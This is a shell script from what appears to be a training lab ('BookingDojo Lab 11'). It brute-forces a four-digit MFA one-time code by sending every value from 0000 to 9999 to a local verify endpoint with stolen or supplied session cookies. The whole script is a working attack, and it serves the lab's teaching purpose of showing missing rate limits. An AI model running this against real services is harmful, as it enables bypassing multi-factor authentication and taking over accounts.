#!/bin/sh
# brute_force_otp.sh — BookingDojo Lab 11
COOKIES="$1"
BFF="http://localhost:5001"

if [ -z "$COOKIES" ]; then
  echo "Usage: $0 <cookie-file>"
  exit 1
fi

# Request a fresh challenge
curl -s -X POST "$BFF/bff/auth/mfa/challenge" \
  -b "$COOKIES" > /dev/null

echo "Brute-forcing OTP (0000–9999)…"
i=0
while [ "$i" -le 9999 ]; do
  CODE=$(printf '%04d' "$i")
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST "$BFF/bff/auth/mfa/verify" \
    -b "$COOKIES" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}")
  if [ "$STATUS" = "200" ]; then
    echo "Found OTP: $CODE (after $i attempts)"
    exit 0
  fi
  i=$(( i + 1 ))
done

echo "Not found — challenge may have expired."